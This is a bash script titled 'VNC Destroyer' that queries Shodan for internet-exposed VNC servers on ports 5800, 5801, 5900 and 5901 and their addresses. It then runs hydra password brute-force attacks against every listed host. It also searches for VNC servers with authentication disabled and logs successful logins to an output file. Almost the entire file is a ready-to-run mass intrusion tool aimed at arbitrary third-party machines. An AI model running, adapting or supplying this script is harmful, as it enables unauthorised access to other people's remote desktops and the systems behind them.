#!/bin/bash
WHITE="\e[97m"
RED="\e[36m"
GREEN="\e[32m"
MAGENTA="\e[35m"
ENDCOLOR="\e[0m"
OUTPUT="output"
PORT_5901=5901
PORT_5900=5900
PORT_5801=5801
PORT_5800=5800


exists()
{
  command -v "$1" >/dev/null 2>&1
}

deleteFiles(){
  rm -rf ip_5900 ip_5901 ip_5800
}

ping(){
  r=$(`nc -vz $1 $2`);
  if [[ $r == *"succeeded"* ]]; then
    echo -e "${GREEN} $1 $2 Exists !${ENDCOLOR}"
  fi
}

checkErrors(){
    if exists hydra; then
        echo " "
        echo -e "\xE2\x9C\x94${GREEN} Hydra Exists !${ENDCOLOR}"
    else
        echo -e "\xE2\x9D\x8C${RED} Error: hydra is not installed${ENDCOLOR}"
        exit 0
    fi

    if exists shodan; then
        echo -e "\xE2\x9C\x94${GREEN} Shodan Exists !${ENDCOLOR}"
    else
        echo -e "\xE2\x9D\x8C${RED} Error: shodan is not installed${ENDCOLOR}"
        exit 0
    fi
}

readAPIKey(){
    checkErrors
    echo -e "${MAGENTA}Enter your Shodan API Key${ENDCOLOR}"; read api_key; shodan init $api_key; 
}

interactive(){
    while true; do
    checkErrors
    echo -e " "
    echo -e "${MAGENTA}Do you want to set your Shodan API Key (Y/N)${ENDCOLOR}"
    read yn
    case $yn in
        
        [Yy]* ) readAPIKey;break;;
        [Nn]* ) echo -e "${MAGENTA}Shodan Search and Brute Force are starting${ENDCOLOR}";searchBruteForce;

        echo -e "${MAGENTA}Finished${ENDCOLOR}";

        
        exit;;
        * ) echo -e "${RED}Please answer Y or N${ENDCOLOR}";;
    esac
done
}

wordlistBruteForce(){
  echo $2
    while IFS= read -r line
    do
      echo $line;
      hydra -P wordlist.txt -t 1 -w 5 -f -s $2 $line vnc -v | grep "host:" >> $OUTPUT;
    done < $1
}

searchBruteForce(){
    echo -e "${MAGENTA}Shodan Searching is starting${ENDCOLOR}";
    shodan search "port:5901 RFB" --fields ip_str >> ip_5901;

    shodan search "port:5900 RFB" --fields ip_str >> ip_5900;

    shodan search "port:5801 RFB" --fields ip_str >> ip_5801;

    shodan search "port:5800 RFB" --fields ip_str >> ip_5800;

    if [ ${#OUTPUT} -gt 0 ]
    then
      echo $OUTPUT;
      input="ip_5901";
      while IFS= read -r line
      do
      echo $line
      hydra -P wordlist.txt -t 1 -w 5 -f -s $PORT_5901 $line vnc -v | grep "host:" >> $OUTPUT;
      done < "$input"

      input="ip_5900";
      while IFS= read -r line
      do
      hydra -P wordlist.txt -t 1 -w 5 -f -s $PORT_5900 $line vnc -v | grep "host:" >> $OUTPUT;
      done < "$input"


      input="ip_5801";
      while IFS= read -r line
      do
      hydra -P wordlist.txt -t 1 -w 5 -f -s $PORT_5801 $line vnc -v | grep "host:" >> $OUTPUT;
      done < "$input"

      input="ip_5800";
      while IFS= read -r line
      do
      hydra -P wordlist.txt -t 1 -w 5 -f -s $PORT_5800 $line vnc -v | grep "host:" >> $OUTPUT;
      done < "$input"

      shodan search "authentication disabled" "RFB" --fields ip_str >> $OUTPUT
    else
      while IFS= read -r line
      do
      echo $line
      hydra -P wordlist.txt -t 1 -w 5 -f -s $PORT_5901 $line vnc -v | grep "host:" >> output;
      done < "$input"

      shodan search "port:5900" --fields ip_str >> ip_5900;

      input="ip_5900";
      while IFS= read -r line
      do
      hydra -P wordlist.txt -t 1 -w 5 -f -s $PORT_5900 $line vnc -v | grep "host:" >> output;
      done < "$input"

      shodan search "port:5800" --fields ip_str >> ip_5800;

      input="ip_5800";
      while IFS= read -r line
      do
      hydra -P wordlist.txt -t 1 -w 5 -f -s $PORT_5800 $line vnc -v | grep "host:" >> output;
      done < "$input"

      shodan search "authentication disabled" "RFB 003.008" --fields ip_str >> output
    fi
        
}

echo -e "${RED}__      ___   _  _____   _____            _                             ${ENDCOLOR}"
echo -e "${RED}\ \    / / \ | |/ ____| |  __ \          | |                            ${ENDCOLOR}"
echo -e "${RED} \ \  / /|  \| | |      | |  | | ___  ___| |_ _ __ ___  _   _  ___ _ __ ${ENDCOLOR}"
echo -e "${RED}  \ \/ / | . \` | |      | |  | |/ _ \/ __| __| '__/ _ \| | | |/ _ \ '__|${ENDCOLOR}"
echo -e "${RED}   \  /  | |\  | |____  | |__| |  __/\__ \ |_| | | (_) | |_| |  __/ |   ${ENDCOLOR}"
echo -e "${RED}    \/   |_| \_|\_____| |_____/ \___||___/\__|_|  \___/ \__, |\___|_|   ${ENDCOLOR}"
echo -e "${RED}                                                         __/ |          ${ENDCOLOR}"
echo -e "${RED}                                                        |___/           ${ENDCOLOR}"
echo -e "${RED}\e[5mauthor:aydinnyunus${ENDCOLOR}"
echo -e " "
echo -e "$0 - VNC BruteForcer${ENDCOLOR}"
echo -e " "
echo -e "$0 [options]${ENDCOLOR}"
echo -e " "
echo -e "${MAGENTA}options:${ENDCOLOR}"
echo -e "${MAGENTA}    -h, --help                        show brief help${ENDCOLOR}"
echo -e "${MAGENTA}    -t, --shodan-api-key=TOKEN        specify an action to use${ENDCOLOR}"
echo -e "${MAGENTA}    -o, --output-dir=DIR              specify a directory to store output in${ENDCOLOR}"
echo -e "${MAGENTA}    -i, --interactive                 Interactive${ENDCOLOR}"

while test $# -gt 0; do
  case "$1" in
    -h|--help)
      echo -e "${MAGENTA}$0 - VNC BruteForcer${ENDCOLOR}"
      echo -e " "
      echo -e "$0 [options]${ENDCOLOR}"
      echo -e " "
      echo -e "${MAGENTA}options:${ENDCOLOR}"
      echo -e "${MAGENTA}    -h, --help                        show brief help${ENDCOLOR}"
      echo -e "${MAGENTA}    -t, --shodan-api-key=TOKEN        specify an action to use${ENDCOLOR}"
      echo -e "${MAGENTA}    -o, --output=FILE                 specify a directory to store output in${ENDCOLOR}"
      echo -e "${MAGENTA}    -i, --interactive                 Interactive${ENDCOLOR}"
      echo -e "${MAGENTA}    -w wordlist PORT, --wordlist                                             Wordlist${ENDCOLOR}"
      exit 0
      ;;
    -t)
      shift
      export api_key=$1
      
      echo -e "${MAGENTA}Shodan Search and Brute Force are starting${ENDCOLOR}"
      searchBruteForce
      echo -e "${MAGENTA}Process finished${ENDCOLOR}"
      deleteFiles
      shift
      ;;
    --shodan-api-key*)
      export api_key=$1
      echo -e "${MAGENTA}Shodan Search and Brute Force are starting${ENDCOLOR}"
      searchBruteForce
      shift
      ;;
    -o)
      shift
      export OUTPUT=$1;
      output >> $OUTPUT;
      rm -rf output;
      exit 1
      shift
      ;;
    --output*)
      export OUTPUT=`echo $1 | sed -e 's/^[^=]*=//g'`
      cat output >> $OUTPUT;
      rm -rf output;
      shift
      ;;
    -i)
      shift
      interactive
      shift
      ;;
    --interactive)
      interactive
      shift
      ;;
    -w)
      shift
      wordlistBruteForce $1 $2
      shift
      ;;
    --wordlist)
      wordlistBruteForce $1 $2
      shift
      ;;
    *)
      break
      ;;
  esac
done


